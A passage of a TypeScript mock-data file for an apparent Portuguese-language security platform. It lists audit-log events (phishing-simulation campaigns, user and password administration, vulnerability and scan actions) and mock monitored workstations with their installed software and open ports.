    action: 'ENVIAR_CAMPANHA',
    detail: 'camp-001: 24 de 24 e-mail(s) enviado(s)',
    at: daysAgo(2),
    user: ANALYST_REF,
  },
  {
    id: 'aud-022',
    action: 'CRIAR_CAMPANHA',
    detail: 'camp-001 (Simulação Q3 – Financeiro, urgencia, 24 destinatário(s))',
    at: daysAgo(2.01),
    user: ANALYST_REF,
  },
  {
    id: 'aud-021',
    action: 'LOGIN_BLOQUEADO',
    detail: '5 falhas em 15 min',
    at: daysAgo(2.5),
    user: COLLAB_REF,
  },
  {
    id: 'aud-020',
    action: 'ALTERAR_STATUS_VULNERABILIDADE',
    detail: 'vuln-013 (db.empresa.com, A06:2021): Em remediação → Resolvida',
    at: daysAgo(3),
    user: ANALYST_REF,
  },
  {
    id: 'aud-019',
    action: 'ATUALIZAR_USUARIO',
    detail: 'u-005: perfil, departamento',
    at: daysAgo(4),
    user: ADMIN_REF,
  },
  {
    id: 'aud-018',
    action: 'ENVIAR_RESET_SENHA',
    detail: 'bruno.lima@empresa.com',
    at: daysAgo(4.2),
    user: ADMIN_REF,
  },
  {
    id: 'aud-017',
    action: 'INICIAR_VARREDURA',
    detail: 'scan-012 no ativo asset-005 (db.empresa.com)',
    at: daysAgo(5),
    user: EDSON_REF,
  },
  {
    id: 'aud-016',
    action: 'CRIAR_ATIVO',
    detail: 'asset-006 (192.168.0.20, Servidor)',
    at: daysAgo(6),
    user: EDSON_REF,
  },
  { id: 'aud-015', action: 'LOGOUT', detail: null, at: daysAgo(6.5), user: EDSON_REF },
  {
    id: 'aud-014',
    action: 'ACEITAR_CONVITE',
    detail: null,
    at: daysAgo(8),
    user: { id: 'u-007', name: 'Marina Costa', email: 'marina.costa@empresa.com' },
  },
  {
    id: 'aud-013',
    action: 'ENVIAR_CONVITE',
    detail: 'marina.costa@empresa.com',
    at: daysAgo(9),
    user: ADMIN_REF,
  },
  {
    id: 'aud-012',
    action: 'CRIAR_USUARIO',
    detail: 'u-007 (marina.costa@empresa.com, Colaborador)',
    at: daysAgo(9.01),
    user: ADMIN_REF,
  },
  { id: 'aud-011', action: 'CRIAR_DEPARTAMENTO', detail: 'Jurídico', at: daysAgo(10), user: ADMIN_REF },
  {
    id: 'aud-010',
    action: 'EXCLUIR_USUARIO',
    detail: 'u-099 (estagiario@empresa.com)',
    at: daysAgo(12),
    user: ADMIN_REF,
  },
  {
    id: 'aud-009',
    action: 'CLIQUE_LINK_PHISHING',
    detail: 'Campanha Junho 2026 – Urgência / ex.colaborador@empresa.com',
    at: daysAgo(14),
    user: null,
  },
  { id: 'aud-008', action: 'ALTERAR_SENHA', detail: null, at: daysAgo(15), user: COLLAB_REF },
  { id: 'aud-007', action: 'SOLICITAR_RESET_SENHA', detail: null, at: daysAgo(15.1), user: COLLAB_REF },
  { id: 'aud-006', action: 'REDEFINIR_SENHA', detail: null, at: daysAgo(15.05), user: COLLAB_REF },
  {
    id: 'aud-005',
    action: 'EXCLUIR_CAMPANHA',
    detail: 'camp-090 (Rascunho antigo)',
    at: daysAgo(20),
    user: ANALYST_REF,
  },
  { id: 'aud-004', action: 'EXCLUIR_DEPARTAMENTO', detail: 'Temporário', at: daysAgo(25), user: ADMIN_REF },
  {
    id: 'aud-003',
    action: 'CRIAR_ATIVO',
    detail: 'asset-005 (db.empresa.com, Banco de Dados)',
    at: daysAgo(30),
    user: ANALYST_REF,
  },
  {
    id: 'aud-002',
    action: 'CRIAR_ATIVO',
    detail: 'asset-003 (portal.empresa.com, Aplicacao)',
    at: daysAgo(31),
    user: ANALYST_REF,
  },
  { id: 'aud-001', action: 'LOGIN', detail: null, at: daysAgo(31.1), user: ANALYST_REF },
].sort((a, b) => Date.parse(b.at) - Date.parse(a.at));

// ---- Estações monitoradas (B13) ---------------------------------------------

/**
 * Janela do mock até a estação virar offline: a mesma do servidor fora de produção
 * (3 intervalos de coleta de 5 min; ver `CICLOS_ATE_OFFLINE` no backend).
 */
export const MOCK_STATION_OFFLINE_AFTER_SEC = 900;

/** Estação guardada no mock: o status e os totais são calculados na leitura, como no servidor. */
export type MockStation = Omit<StationDetail, 'status' | 'softwareCount' | 'portCount' | 'offlineAfterSec'>;

function sw(
  name: string,
  version: string,
  vendor: string | null,
  source: StationSoftware['source'],
): StationSoftware {
  return { name, version, vendor, source };
}

function tcp(port: number, address: string, process: string | null): StationPort {
  return { port, protocol: 'TCP', address, process };
}

function udp(port: number, address: string, process: string | null): StationPort {
  return { port, protocol: 'UDP', address, process };
}

/**
 * Estações iniciais, com o último contato relativo a `nowMs` (o relógio real, para que o
 * online/offline faça sentido na demonstração): Windows e Linux, uma parada há dias
 * (offline) e uma recém-inscrita, ainda sem inventário. Os ativos delas não entram em
 * MOCK_ASSETS: as telas de ativos e varreduras do mock seguem só com os ativos de rede.
 */
export function buildMockStations(nowMs: number = Date.now()): MockStation[] {
  const ago = (ms: number) => new Date(nowMs - ms).toISOString();
  const hostId = (n: number) => `4c4c4544-0042-3510-8052-b4c04f4d3${String(n).padStart(3, '0')}`;
  return [
    {
      id: 'ws-001',
      assetId: 'asset-ws-001',
      name: 'FIN-NB-07',
      host: 'fin-nb-07.empresa.local',
      identifier: hostId(1),
      os: 'Microsoft Windows 11 Pro 10.0.22631',
      osPlatform: 'windows',
      osBuild: '22631',
      lastSeenAt: ago(2 * MINUTE_MS),
      enrolledAt: ago(21 * DAY_MS),
      inventoryAt: ago(4 * MINUTE_MS),
      software: [
        sw('7-Zip 23.01 (x64)', '23.01', 'Igor Pavlov', 'programs'),
        sw('Adobe Acrobat Reader (64-bit)', '24.003.20112', 'Adobe', 'programs'),
        sw('Google Chrome', '129.0.6668.90', 'Google LLC', 'programs'),
        sw(
          'Microsoft 365 Apps for business - pt-br',
          '16.0.17928.20156',
          'Microsoft Corporation',
          'programs',
        ),
        sw('Microsoft Edge', '129.0.2792.79', 'Microsoft Corporation', 'programs'),
        sw('osquery', '5.12.1', 'osquery', 'programs'),
        sw('Zoom Workplace (64-bit)', '6.2.3', 'Zoom Video Communications, Inc.', 'programs'),
      ],
      ports: [
        tcp(135, '0.0.0.0', 'svchost.exe'),
        udp(137, '192.168.10.47', 'System'),
        tcp(445, '0.0.0.0', 'System'),
        tcp(3389, '0.0.0.0', 'svchost.exe'),
        tcp(5040, '0.0.0.0', 'svchost.exe'),
      ],
    },
    {
      id: 'ws-002',
      assetId: 'asset-ws-002',
      name: 'dev-ws-02',
      host: 'dev-ws-02.empresa.local',
      identifier: hostId(2),
      os: 'Ubuntu 22.04.4 LTS (Jammy Jellyfish)',
      osPlatform: 'ubuntu',
      osBuild: null,
      lastSeenAt: ago(1 * MINUTE_MS),
      enrolledAt: ago(34 * DAY_MS),
      inventoryAt: ago(3 * MINUTE_MS),
      software: [
        sw('curl', '7.81.0-1ubuntu1.18', 'Ubuntu Developers', 'deb_packages'),
        sw('docker-ce', '5:27.3.1-1~ubuntu.22.04~jammy', 'Docker', 'deb_packages'),
        sw('git', '1:2.34.1-1ubuntu1.11', 'Ubuntu Developers', 'deb_packages'),
        sw('openssh-server', '1:8.9p1-3ubuntu0.10', 'Ubuntu Developers', 'deb_packages'),
        sw('openssl', '3.0.2-0ubuntu1.18', 'Ubuntu Developers', 'deb_packages'),
        sw('osquery', '5.12.1-1.linux', 'osquery', 'deb_packages'),
        sw('postgresql-16', '16.4-1.pgdg22.04+2', 'Debian PostgreSQL Maintainers', 'deb_packages'),
        sw('python3', '3.10.6-1~22.04.1', 'Ubuntu Developers', 'deb_packages'),
      ],
      ports: [
        tcp(22, '0.0.0.0', 'sshd'),
        udp(68, '0.0.0.0', 'dhclient'),
        tcp(5432, '127.0.0.1', 'postgres'),
        tcp(8080, '0.0.0.0', 'node'),
      ],
    },
    {
      id: 'ws-003',
      assetId: 'asset-ws-003',
      name: 'RH-NB-03',
      host: 'rh-nb-03.empresa.local',
      identifier: hostId(3),
      os: 'Microsoft Windows 10 Pro 10.0.19045',
      osPlatform: 'windows',
      osBuild: '19045',
      lastSeenAt: ago(2 * DAY_MS + 5 * HOUR_MS),
      enrolledAt: ago(48 * DAY_MS),
      inventoryAt: ago(2 * DAY_MS + 5 * HOUR_MS),
      software: [
        sw('Google Chrome', '118.0.5993.118', 'Google LLC', 'programs'),
        sw('Java 8 Update 381', '8.0.3810.9', 'Oracle Corporation', 'programs'),
        sw('Microsoft Office Profissional Plus 2016', '16.0.4266.1001', 'Microsoft Corporation', 'programs'),
        sw('osquery', '5.12.1', 'osquery', 'programs'),
        sw('WinRAR 6.02 (64-bit)', '6.02.0', 'win.rar GmbH', 'programs'),
      ],
      ports: [tcp(135, '0.0.0.0', 'svchost.exe'), tcp(445, '0.0.0.0', 'System')],
    },
    {
      id: 'ws-004',
      assetId: 'asset-ws-004',
      name: 'ops-ws-05',
      host: 'ops-ws-05.empresa.local',
      identifier: hostId(4),
      os: 'Red Hat Enterprise Linux 9.4 (Plow)',
      osPlatform: 'rhel',
      osBuild: null,
      lastSeenAt: ago(6 * MINUTE_MS),
      enrolledAt: ago(12 * DAY_MS),
      inventoryAt: ago(6 * MINUTE_MS),
      software: [
        sw('bash', '5.1.8-9.el9', 'Red Hat, Inc.', 'rpm_packages'),
        sw('openssh-server', '8.7p1-38.el9', 'Red Hat, Inc.', 'rpm_packages'),
        sw('openssl', '3.0.7-27.el9', 'Red Hat, Inc.', 'rpm_packages'),
        sw('osquery', '5.12.1-1.linux', 'osquery', 'rpm_packages'),
      ],
      ports: [tcp(22, '0.0.0.0', 'sshd'), udp(323, '127.0.0.1', 'chronyd')],
    },
    {
      id: 'ws-005',
      assetId: 'asset-ws-005',
      name: 'COM-NB-01',
      host: 'com-nb-01.empresa.local',
      identifier: hostId(5),
      os: 'Microsoft Windows 11 Pro 10.0.26100',
      osPlatform: 'windows',
      osBuild: '26100',
      lastSeenAt: ago(30_000),
      enrolledAt: ago(30_000),
      inventoryAt: null,
      software: [],
      ports: [],
    },
  ];
}
